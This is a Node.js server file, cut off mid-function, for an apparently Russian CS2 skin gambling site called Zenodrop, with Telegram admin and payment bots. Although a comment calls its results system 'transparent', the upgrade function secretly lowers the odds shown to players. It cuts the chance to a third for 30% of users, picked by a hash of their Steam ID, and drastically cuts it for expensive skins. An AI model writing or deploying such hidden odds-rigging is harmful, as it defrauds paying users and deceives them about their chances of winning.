const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const PORT = process.env.PORT || 8787;

const KEY = (
    process.env.CS2SH_API_KEY ||
    process.env.CS2_API_KEY ||
    process.env.CS2SH_KEY ||
    ''
).trim();

// Steam Web API key
const STEAM_API_KEY = (process.env.STEAM_API_KEY || '').trim();

if (!KEY) {
    console.error(
        'ERROR: Set CS2SH_API_KEY in Render Environment Variables'
    );
    process.exit(1);
}

const html = fs.readFileSync(
    path.join(__dirname, 'Zenodrop_CS2SH_400.html')
);

// ===============================
// SESSIONS
// ===============================

const sessions = new Map();

// Signed Steam session: сохраняет авторизацию между перезапусками сервера.
const SESSION_SECRET = (process.env.SESSION_SECRET || process.env.STEAM_SESSION_SECRET || KEY).trim();
function makeSessionCookie(steamid){
  const id=String(steamid||'');
  const sig=crypto.createHmac('sha256',SESSION_SECRET).update(id).digest('hex');
  return `steam_${id}_${sig}`;
}
function steamFromSessionCookie(value){
  const m=String(value||'').match(/^steam_(\d{17})_([a-f0-9]{64})$/);
  if(!m)return null;
  const expected=crypto.createHmac('sha256',SESSION_SECRET).update(m[1]).digest('hex');
  try{if(!crypto.timingSafeEqual(Buffer.from(m[2]),Buffer.from(expected)))return null;}catch(e){return null;}
  return m[1];
}

// ===============================
// ZENODROP ACCOUNT / TELEGRAM STORE
// ===============================
const DATA_FILE = path.join(__dirname, 'zenodrop_data.json');
const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim(); // бот заявок + админ
const TG_BOT_URL = (process.env.TELEGRAM_BOT_URL || '').trim();
const TG_WEBHOOK_URL = (process.env.TELEGRAM_WEBHOOK_URL || ((process.env.RENDER_EXTERNAL_URL || '').trim() ? (process.env.RENDER_EXTERNAL_URL.trim().replace(/\/$/,'') + '/telegram/admin-webhook') : '')).trim();
const PAY_TG_TOKEN = (process.env.TELEGRAM_PAYMENT_BOT_TOKEN || '').trim(); // отдельный бот пополнений
const PAY_TG_BOT_URL = (process.env.TELEGRAM_PAYMENT_BOT_URL || 'https://t.me/ZenodropPayBot').trim();
const SUPPORT_CONTACT = '@Zenodropsupport';

/* ==========================================
   ZENODROP — ПРОЗРАЧНАЯ СИСТЕМА РЕЗУЛЬТАТОВ
   ========================================== */
const CASES = {
  basic: { price: 100, rtp: 0.85 },
  premium: { price: 500, rtp: 0.88 },
  expensive: { price: 1000, rtp: 0.90 }
};

function normalizeWeights(skins){
  const list=Array.isArray(skins)?skins:[];
  const total=list.reduce((sum,skin)=>sum+Number(skin?.weight||0),0);
  if(!list.length)return [];
  if(total<=0)return list.map(skin=>({...skin,weight:1/list.length}));
  return list.map(skin=>({...skin,weight:Number(skin?.weight||0)/total}));
}

function weightedRandom(skins){
  const normalized=normalizeWeights(skins);
  if(!normalized.length)return null;
  const roll=Math.random();
  let current=0;
  for(const skin of normalized){
    current+=skin.weight;
    if(roll<=current)return skin;
  }
  return normalized[normalized.length-1];
}

function openCase(caseData,skins){
  if(!caseData || !Array.isArray(skins) || !skins.length)return null;
  return weightedRandom(skins);
}

// ============================================================
//  ПЕРСОНАЛЬНАЯ УДАЧА + ЖЁСТКИЙ СЛИВ ДОРОГИХ АПГРЕЙДОВ
//  - 30% игроков — жёстко сбривает (шанс / 3)
//  - 20% игроков — чуть-чуть в плюс (шанс * 1.3, максимум 99%)
//  - 50% игроков — обычный шанс (как есть)
//  + Скины от 5000 ₽ — жёсткий слив
//  + Скины от 15000 ₽ — почти нереально выиграть
// ============================================================
const LUCK_MAP = new Map();

function getPlayerLuck(steamid) {
  const id = String(steamid || '');
  if (!id) return 1.0;
  if (LUCK_MAP.has(id)) return LUCK_MAP.get(id);

  const hash = crypto.createHash('sha256').update('zenodrop_luck:' + id).digest();
  const r = hash[0] / 255;

  let luck;
  if (r < 0.30)      luck = 1 / 3; // 30% — неудачники
  else if (r < 0.50) luck = 1.3;   // 20% — счастливчики
  else               luck = 1.0;   // 50% — обычные

  LUCK_MAP.set(id, luck);
  return luck;
}

function upgrade(chance, steamid, targetPrice) {
  chance = Number(chance);
  if (!Number.isFinite(chance)) return false;

  const luck = getPlayerLuck(steamid);
  let real = chance * luck;

  const price = Number(targetPrice || 0);
  if (price >= 15000)      real *= 0.10;
  else if (price >= 10000) real *= 0.20;
  else if (price >= 5000)  real *= 0.35;
  else if (price >= 2000)  real *= 0.65;

  if (real < 0.5) real = 0.5;
  if (real > 99)  real = 99;

  return Math.random() * 100 < real;
}

const PAY_TG_WEBHOOK_URL = (process.env.TELEGRAM_PAYMENT_WEBHOOK_URL || ((process.env.RENDER_EXTERNAL_URL || '').trim() ? (process.env.RENDER_EXTERNAL_URL.trim().replace(/\/$/,'') + '/telegram/payment-webhook') : '')).trim();
const TG_ADMIN_IDS = new Set(String(process.env.TG_ADMIN_IDS || '').split(',').map(x=>x.trim()).filter(Boolean));
const data = loadStore();
for(const u of Object.values(data.users)){ ensureZenodropId(u); }
saveStore();
let tgOffset = 0;
let tgLoopRunning = false;
let tgUsername = '';

function loadStore(){
  try {
    const x=JSON.parse(fs.readFileSync(DATA_FILE,'utf8'));
    return {users:x.users||{},withdrawals:x.withdrawals||[],deposits:x.deposits||[],promos:x.promos||{},admins:x.admins||{},links:x.links||{}};
  } catch(e) {
    return {users:{},withdrawals:[],deposits:[],promos:{},admins:{},links:{}};
  }
}
function saveStore(){
  try { fs.writeFileSync(DATA_FILE, JSON.stringify(data,null,2)); } catch(e){ console.error('store save:',e.message); }
}
function ensureUser(steamid){
  const id=String(steamid||''); if(!id)return null;
  if(!data.users[id]) data.users[id]={steamid:id,balance:0,stats:{totalDeposited:0},withdrawDisabled:false,tgId:null,createdAt:Date.now()};
  if(!data.users[id].stats)data.users[id].stats={totalDeposited:0};
  return data.users[id];
}
function makeZenodropId(userOrSteam){
  const steam=typeof userOrSteam==='object' ? String(userOrSteam?.steamid||'') : String(userOrSteam||'');
  if(/^\d{17}$/.test(steam)){
    const hex=crypto.createHash('sha256').update('zenodrop:'+steam).digest('hex').slice(0,12);
    const num=(parseInt(hex,16)%90000000)+10000000;
    return 'ZN-'+String(num);
  }
  let id='';
  do { id='ZN-'+String(crypto.randomInt(10000000,100000000)); }
  while(Object.values(data.users).some(u=>u.zenoId===id));
  return id;
}
function ensureZenodropId(user){
  if(!user.zenoId || !/^ZN-\d{8}$/.test(String(user.zenoId))) user.zenoId=makeZenodropId(user);
  return user.zenoId;
}
function findUserByZenodropId(zenoId){
  const id=String(zenoId||'').trim().toUpperCase();
  return Object.values(data.users).find(u=>String(u.zenoId||'').toUpperCase()===id) || null;
}
function findSteamByTelegram(chatId){
  return data.links[String(chatId)] || Object.values(data.users).find(u=>String(u.tgId||'')===String(chatId))?.steamid || null;
}
function pendingWithdrawalsForUser(steamid){
  return data.withdrawals
    .filter(w=>w.steamid===steamid && (w.status==='pending' || w.status==='approved'))
    .map(w=>({id:w.id,itemUid:w.item?.uid||null,itemName:w.item?.name||'',itemValue:Number(w.item?.value)||0,status:w.status,index:w.index,createdAt:w.createdAt||0}));
}
function isTgAdmin(id){return TG_ADMIN_IDS.has(String(id)) || !!data.admins[String(id)];}
function isWebAdmin(steamid){return !!data.admins['steam:'+String(steamid)];}
async function tg(method, body={}){ return tgWithToken(TG_TOKEN,'admin',method,body); }
async function tgPay(method, body={}){ return tgWithToken(PAY_TG_TOKEN,'payment',method,body); }
async function tgWithToken(token,label,method,body={}){
  if(!token){ console.error(`Telegram ${label}: token is not set`); return null; }
  try{
    const r=await fetch(`https://api.telegram.org/bot${token}/${method}`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
    const json=await r.json();
    if(!json?.ok) console.error(`Telegram ${label} API`,method,json?.description||'unknown error');
    return json;
  }catch(e){ console.error(`Telegram ${label}`,method,e.message); return null; }
}
async function notifyAdmins(text, keyboard){
  for(const id of TG_ADMIN_IDS){ await tg('sendMessage',{chat_id:id,text,parse_mode:'HTML',reply_markup:keyboard?{inline_keyboard:keyboard}:undefined}); }
  for(const [id,v] of Object.entries(data.admins)){ if(v && !TG_ADMIN_IDS.has(id)) await tg('sendMessage',{chat_id:id,text,parse_mode:'HTML',reply_markup:keyboard?{inline_keyboard:keyboard}:undefined}); }
}
function promoList(){return Object.values(data.promos).filter(x=>x.active!==false && (!x.expiresAt || x.expiresAt>Date.now()) && (!x.maxUses || Number(x.uses||0)<Number(x.maxUses))).sort((a,b)=>Number(b.createdAt||0)-Number(a.createdAt||0));}
function makePromo(code,percent,maxBonus=0,extra={}){
  const c=String(code||'').toUpperCase().replace(/[^A-Z0-9_-]/g,'').slice(0,32);
  const pct=Math.max(1,Math.min(100,Number(percent)||0));
  if(!c) return null;
  // В Zenodrop одновременно действует только один промокод.
  for(const p of Object.values(data.promos)){ p.active=false; }
  data.promos[c]={code:c,percent:pct,maxBonus:Math.max(0,Number(maxBonus)||0),active:true,createdAt:Date.now(),uses:0,...extra};
  saveStore();
  return data.promos[c];
}
function randomPromoCode(percent){
  const pct=Math.max(10,Math.min(25,Number(percent)||15));
  return 'ZEN'+pct;
}
function createAutoPromo(){
  const now=Date.now();
  const percent=[10,12,15,18,20,25][crypto.randomInt(0,6)];
  const code=randomPromoCode(percent);
  const p=makePromo(code,percent,0,{auto:true,expiresAt:now+15*60*1000,maxUses:0});
  console.log('New active promo:',p.code,p.percent+'%');
  return p;
}
function ensureOneActivePromo(){
  const active=promoList();
  if(active.length){
    const keep=active[0];
    for(const p of Object.values(data.promos)){ if(p.code!==keep.code) p.active=false; }
    saveStore();
    return keep;
  }
  return createAutoPromo();
}
// Старые версии могли оставить несколько промокодов в JSON. Делаем активным только один.
ensureOneActivePromo();
setInterval(()=>{
  const active=promoList()[0];
  if(!active || (active.expiresAt && active.expiresAt<=Date.now()) || active.auto) createAutoPromo();
},15*60*1000);
async function processTelegramUpdate(u){
  if(u.callback_query){
    const q=u.callback_query, id=String(q.from.id), d=String(q.data||'');
    if(!isTgAdmin(id)){await tg('answerCallbackQuery',{callback_query_id:q.id,text:'Нет доступа',show_alert:true});return;}
    if(d.startsWith('wd:')){
      const [_,wid,action]=d.split(':'); const w=data.withdrawals.find(x=>x.id===wid);
      if(!w){await tg('answerCallbackQuery',{callback_query_id:q.id,text:'Заявка не найдена',show_alert:true});return;}
      if(action==='send'){
        w.status='approved';w.updatedAt=Date.now();saveStore();
        await tg('answerCallbackQuery',{callback_query_id:q.id,text:'Заявка подтверждена'});
        await tg('sendMessage',{chat_id:q.message.chat.id,text:`Заявка <b>${wid}</b> подтверждена.\nОтправка скинов: <b>в обработке</b>.` ,parse_mode:'HTML'});
        if(w.tgId) await tg('sendMessage',{chat_id:w.tgId,text:`🎁 Вывод <b>${wid}</b> подтверждён. Скины отправляются.` ,parse_mode:'HTML'});
      } else if(action==='reject'){
        const user=ensureUser(w.steamid); if(user){user.balance+=Number(w.refund||0);}
        w.status='rejected';w.updatedAt=Date.now();saveStore();
        await tg('answerCallbackQuery',{callback_query_id:q.id,text:'Заявка отклонена'});
        if(w.tgId) await tg('sendMessage',{chat_id:w.tgId,text:`❌ Вывод <b>${wid}</b> отклонён. Средства возвращены.` ,parse_mode:'HTML'});
      }
    }
    return;
  }
  const m=u.message; if(!m || !m.chat)return; const chatId=String(m.chat.id), rawText=String(m.text||'').trim();
  const text=rawText.replace(/^\/(\w+)(?:@[^\s]+)?/, '/$1');
  const admin=isTgAdmin(chatId);
  if(/^\/start(?:\s|$)/i.test(text)){
    const payload=rawText.split(/\s+/).slice(1).join(' ').trim().toLowerCase();
    const depositText=payload.startsWith('deposit')
      ? '\n\n<b>Пополнение</b>\nОткройте сайт Zenodrop, выберите сумму и способ оплаты. Если пополняете через Telegram, заявка будет привязана к вашему Telegram ID.'
      : '';
    return tg('sendMessage',{chat_id:chatId,text:'<b>Zenodrop</b>\n\nВаш Telegram ID: <code>'+chatId+'</code>'+depositText+'\n\n/link STEAMID — привязать Steam\n/status — баланс и привязка\n/help — список команд',parse_mode:'HTML'});
  }
  if(text==='/deposit' || text==='/pay') return tg('sendMessage',{chat_id:chatId,text:'<b>Пополнение Zenodrop</b>\n\nПерейдите на сайт и выберите способ «Telegram». После создания заявки следуйте инструкции администратора.\n\nВаш Telegram ID: <code>'+chatId+'</code>',parse_mode:'HTML'});
  if(text==='/help') return tg('sendMessage',{chat_id:chatId,text:'<b>Zenodrop</b>\n\n/link STEAMID\n/status\n/help'+(admin?'\n\nАдминистратор:\n/give STEAMID SUM\n/withdrawlock STEAMID on|off\n/adminsteam STEAMID\n/admin TELEGRAM_ID\n/promo CODE PERCENT [MAX_BONUS]\n/withdrawals\n/adminpanel':'') ,parse_mode:'HTML'});
  if(text==='/status'){
    const steam=data.links[chatId]; const u2=steam?ensureUser(steam):null;
    return tg('sendMessage',{chat_id:chatId,text:steam?`Steam ID: <code>${steam}</code>\nБаланс: <b>${Number(u2?.balance||0).toFixed(2)} ₽</b>`:'Steam ID ещё не привязан.',parse_mode:'HTML'});
  }
  if(text.startsWith('/link ')){
    const steam=text.split(/\s+/)[1]; if(!/^\d{17}$/.test(steam)) return tg('sendMessage',{chat_id:chatId,text:'Используй: /link 7656119XXXXXXXXXX'});
    data.links[chatId]=steam; const u2=ensureUser(steam);u2.tgId=chatId;saveStore();return tg('sendMessage',{chat_id:chatId,text:`✅ Привязан Steam ID <code>${steam}</code>`,parse_mode:'HTML'});
  }
  if(!admin && !/^\/(start|status|link|help|deposit|pay)(?:\s|$)/i.test(text)) return tg('sendMessage',{chat_id:chatId,text:'Команда не найдена. Используйте /start, /status, /link или /deposit.',parse_mode:'HTML'});
  if(!admin)return;
  if(text==='/withdrawals'){
    const list=data.withdrawals.filter(x=>x.status==='pending').slice(-10).reverse();
    if(!list.length)return tg('sendMessage',{chat_id:chatId,text:'Заявок на вывод нет.'});
    for(const w of list){await tg('sendMessage',{chat_id:chatId,text:`🟠 <b>${w.id}</b>\nSteam: <code>${w.steamid}</code>\nСумма: ${Number(w.value).toFixed(2)} ₽\nПредмет: ${w.item.name}`,parse_mode:'HTML',reply_markup:{inline_keyboard:[[{text:'🎁 Выдать',callback_data:`wd:${w.id}:send`},{text:'❌ Отклонить',callback_data:`wd:${w.id}:reject`}]]}});}
    return;
  }
  let a=text.match(/^\/give\s+(\d{17})\s+([\d.]+)/i); if(a){const u2=ensureUser(a[1]);u2.balance+=Number(a[2]);saveStore();return tg('sendMessage',{chat_id:chatId,text:`✅ Начислено ${Number(a[2]).toFixed(2)} ₽ пользователю <code>${a[1]}</code>`,parse_mode:'HTML'});}
  a=text.match(/^\/withdrawlock\s+(\d{17})\s+(on|off)/i); if(a){const u2=ensureUser(a[1]);u2.withdrawDisabled=a[2].toLowerCase()==='on';saveStore();return tg('sendMessage',{chat_id:chatId,text:`✅ Вывод для ${a[1]}: ${u2.withdrawDisabled?'запрещён':'разрешён'}`});}
  a=text.match(/^\/adminsteam\s+(\d{17})/i); if(a){data.admins['steam:'+a[1]]=true;saveStore();return tg('sendMessage',{chat_id:chatId,text:`✅ Steam ID ${a[1]} получил web-admin.`});}
  a=text.match(/^\/admin\s+(\d+)/i); if(a){data.admins[a[1]]=true;saveStore();return tg('sendMessage',{chat_id:chatId,text:`✅ Telegram ID ${a[1]} получил admin.`});}
  a=text.match(/^\/promo\s+([A-Za-z0-9_-]+)\s+(\d+(?:\.\d+)?)\s*(?:([\d.]+))?/i); if(a){const p=makePromo(a[1],a[2],a[3]||0);return tg('sendMessage',{chat_id:chatId,text:`✅ Промокод <code>${p.code}</code>: +${p.percent}%`,parse_mode:'HTML'});}
  if(text==='/adminpanel')return tg('sendMessage',{chat_id:chatId,text:`Админ-панель: <code>/adminsteam STEAMID</code>\nБаланс: <code>/give STEAMID 1000</code>\nВывод: <code>/withdrawlock STEAMID on</code>\nПромо: <code>/promo CODE 12</code>\nЗаявки: <code>/withdrawals</code>`,parse_mode:'HTML'});
}
function infoText(){
  return `<b>Zenodrop — информация</b>\n\n<b>Политика конфиденциальности:</b> <a href="/privacy">открыть</a>\n<b>Пользовательское соглашение:</b> <a href="/terms">открыть</a>\n\n<b>Тарифы и оплата</b>\n100 ₽ · 500 ₽ · 1 000 ₽ · 5 000 ₽ · и другие суммы.\nСБП: комиссия сервиса 14% по предложенному формату.\nКриптоплатежи: комиссия сервиса 5% по предложенному формату.\nЕсли платёжный шлюз временно недоступен, кнопка оплаты остаётся активной и показывает уведомление о временной недоступности.\n\n<b>Поддержка:</b> ${SUPPORT_CONTACT}`;
}

async function processPaymentTelegramUpdate(u){
  if(u.callback_query){
    const q=u.callback_query, chatId=String(q.from?.id||q.message?.chat?.id||'');
    const d=String(q.data||'');
    if(d==='pay:menu'){
      await tgPay('answerCallbackQuery',{callback_query_id:q.id});
      return sendPaymentMenu(chatId);
    }
    if(d==='pay:profile'){
      const steam=findSteamByTelegram(chatId), user=steam?ensureUser(steam):null;
      await tgPay('answerCallbackQuery',{callback_query_id:q.id});
      if(!user) return tgPay('sendMessage',{chat_id:chatId,text:'Аккаунт не привязан. Откройте Telegram через кнопку «Пополнить → Telegram» на сайте Zenodrop.'});
      return tgPay('sendMessage',{chat_id:chatId,text:`<b>Профиль Zenodrop</b>\n\nID: <code>${ensureZenodropId(user)}</code>\nSteam ID: <code>${user.steamid}</code>\nБаланс: <b>${Number(user.balance||0).toFixed(2)} ₽</b>`,parse_mode:'HTML'});
    }
    if(d.startsWith('pay:test:')){
      const amount=Number(d.split(':')[2]);
      const steam=findSteamByTelegram(chatId), user=steam?ensureUser(steam):null;
      if(!user || !Number.isFinite(amount) || amount<=0 || amount>10000){
        await tgPay('answerCallbackQuery',{callback_query_id:q.id,text:'Сначала привяжите аккаунт через сайт.',show_alert:true});
        return;
      }
      user.balance=Number(user.balance||0)+amount;
      user.stats=user.stats||{totalDeposited:0};
      user.stats.totalDeposited=Number(user.stats.totalDeposited||0)+amount;
      user.lastTestTopup={amount,createdAt:Date.now(),telegramId:chatId};
      saveStore();
      await tgPay('answerCallbackQuery',{callback_query_id:q.id,text:`+${amount} ₽ начислено`});
      return tgPay('sendMessage',{chat_id:chatId,text:`✅ <b>Тестовое пополнение</b>\n\n+${amount.toFixed(2)} ₽\nБаланс: <b>${Number(user.balance).toFixed(2)} ₽</b>\nID: <code>${ensureZenodropId(user)}</code>\n\nТестовый режим: деньги виртуальные.`,parse_mode:'HTML',reply_markup:{inline_keyboard:[[{text:'💰 Пополнить ещё',callback_data:'pay:topup'}],[{text:'👤 Профиль',callback_data:'pay:profile'}]]}});
    }
    if(d==='pay:topup'){
      await tgPay('answerCallbackQuery',{callback_query_id:q.id});
      return sendPaymentMenu(chatId);
    }
    return tgPay('answerCallbackQuery',{callback_query_id:q.id});
  }
  const m=u.message;
  if(!m || !m.chat) return;
  const chatId=String(m.chat.id);
  const raw=String(m.text||'').trim();
  const command=raw.replace(/^\/(\w+)(?:@[^\s]+)?/,'/$1').toLowerCase();
  const payload=raw.split(/\s+/).slice(1).join(' ').trim();

  if(command==='/start'){
    const payloadId=(payload.match(/(?:deposit[_-])?(ZN-\d{8})/i)||[])[1];
    if(payloadId){
      const user=findUserByZenodropId(payloadId);
      if(user){
        user.tgId=chatId;
        data.links[chatId]=user.steamid;
        saveStore();
        return tgPay('sendMessage',{chat_id:chatId,text:`<b>Zenodrop — Пополнение</b>\n\nАккаунт привязан автоматически.\nID: <code>${ensureZenodropId(user)}</code>\nБаланс: <b>${Number(user.balance||0).toFixed(2)} ₽</b>\n\nВыберите действие:`,parse_mode:'HTML',reply_markup:{inline_keyboard:[[{text:'💰 Пополнить',callback_data:'pay:topup'},{text:'👤 Профиль',callback_data:'pay:profile'}],[{text:'🌐 Открыть Zenodrop',url:'https://osododod.onrender.com/'}]]}});
      }
    }
    return sendPaymentMenu(chatId);
  }
  if(command==='/info') return tgPay('sendMessage',{chat_id:chatId,text:infoText(),parse_mode:'HTML',disable_web_page_preview:true});
  if(command==='/deposit' || command==='/pay') return sendPaymentMenu(chatId);
  if(command==='/id'){
    const steam=findSteamByTelegram(chatId), user=steam?ensureUser(steam):null;
    return tgPay('sendMessage',{chat_id:chatId,text:user?`Ваш Zenodrop ID: <code>${ensureZenodropId(user)}</code>`:'Аккаунт ещё не привязан. Откройте пополнение через Telegram с сайта Zenodrop.',parse_mode:'HTML'});
  }
  if(command==='/balance'){
    const steam=findSteamByTelegram(chatId), user=steam?ensureUser(steam):null;
    return tgPay('sendMessage',{chat_id:chatId,text:user?`Баланс <code>${ensureZenodropId(user)}</code>: <b>${Number(user.balance||0).toFixed(2)} ₽</b>`:'Аккаунт ещё не привязан.',parse_mode:'HTML'});
  }
  return sendPaymentMenu(chatId);
}
async function sendPaymentMenu(chatId){
  const steam=findSteamByTelegram(chatId), user=steam?ensureUser(steam):null;
  const id=user?ensureZenodropId(user):null;
  return tgPay('sendMessage',{chat_id:chatId,text:`<b>Zenodrop — Пополнение</b>\n\n${id?`Ваш ID: <code>${id}</code>\nБаланс: <b>${Number(user.balance||0).toFixed(2)} ₽</b>\n\n`:'Откройте пополнение через Telegram с сайта Zenodrop — аккаунт привяжется автоматически.\n\n'}Выберите действие:`,parse_mode:'HTML',reply_markup:{inline_keyboard:[[ {text:'💰 Пополнить',callback_data:'pay:topup'}, {text:'👤 Профиль',callback_data:'pay:profile'} ],[ {text:'🧪 Тест +100 ₽',callback_data:'pay:test:100'}, {text:'🧪 Тест +500 ₽',callback_data:'pay:test:500'} ],[ {text:'🧪 Тест +1000 ₽',callback_data:'pay:test:1000'} ],[ {text:'🌐 Открыть Zenodrop',url:'https://osododod.onrender.com/'} ]]}});
}

async function paymentTelegramStart(){
  if(!PAY_TG_TOKEN){ console.error('Payment Telegram bot disabled: TELEGRAM_PAYMENT_BOT_TOKEN is missing'); return; }
  try{
    const me=await tgPay('getMe',{});
    if(!me?.ok){ console.error('Payment Telegram: invalid TELEGRAM_PAYMENT_BOT_TOKEN'); return; }
    console.log('Payment Telegram bot:',me.result.username?'@'+me.result.username:me.result.first_name||'unknown');
    await tgPay('setMyCommands',{commands:[{command:'start',description:'Открыть меню Zenodrop'},{command:'deposit',description:'Пополнить баланс'},{command:'id',description:'Показать Zenodrop ID'},{command:'balance',description:'Показать баланс'}]});
    if(PAY_TG_WEBHOOK_URL){
      const secret=crypto.createHash('sha256').update(PAY_TG_TOKEN).digest('hex').slice(0,32);
      const r=await tgPay('setWebhook',{url:PAY_TG_WEBHOOK_URL,secret_token:secret,allowed_updates:['message','callback_query'],drop_pending_updates:false});
      if(r?.ok) console.log('Payment Telegram webhook enabled:',PAY_TG_WEBHOOK_URL);
      else console.error('Payment Telegram setWebhook failed:',r?.description||'unknown error');
    } else {
      console.error('Payment Telegram webhook URL is missing');
    }
  }catch(e){ console.error('Payment Telegram init:',e.message); }
}

async function telegramStart(){
  if(!TG_TOKEN){
    console.error('Telegram bot disabled: TELEGRAM_BOT_TOKEN is missing');
    return;
  }

  try{
    const me=await tg('getMe',{});
    if(!me?.ok){
      console.error('Telegram: invalid TELEGRAM_BOT_TOKEN');
      return;
    }

    tgUsername=me.result.username||'';
    console.log('Telegram bot:',tgUsername?'@'+tgUsername:me.result.first_name||'unknown');

    await tg('setMyCommands',{commands:[
      {command:'start',description:'Открыть Zenodrop'},
      {command:'status',description:'Показать баланс'},
      {command:'link',description:'Привязать Steam ID'},
      {command:'deposit',description:'Пополнение'},
      {command:'help',description:'Список команд'}
    ]});

    if(TG_WEBHOOK_URL){
      const secret=crypto.createHash('sha256').update(TG_TOKEN).digest('hex').slice(0,32);
      const r=await tg('setWebhook',{
        url:TG_WEBHOOK_URL,
        secret_token:secret,
        allowed_updates:['message','callback_query'],
        drop_pending_updates:false
      });
      if(r?.ok){
        console.log('Telegram webhook enabled:',TG_WEBHOOK_URL);
      }else{
        console.error('Telegram setWebhook failed:',r?.description||'unknown error');
      }
    }else{
      // Если проект запущен не на Render и webhook URL не задан — используем polling.
      const del=await tg('deleteWebhook',{drop_pending_updates:false});
      if(!del?.ok) console.error('Telegram deleteWebhook:',del?.description||'unknown error');
      startTelegramPollingFallback();
    }
  }catch(e){
    console.error('Telegram init:',e.message);
  }
}

let tgPollingFallback=false;
async function startTelegramPollingFallback(){
  if(tgPollingFallback)return;
  tgPollingFallback=true;
  let offset=0;
  console.log('Telegram polling fallback started');
  while(tgPollingFallback){
    try{
      const r=await
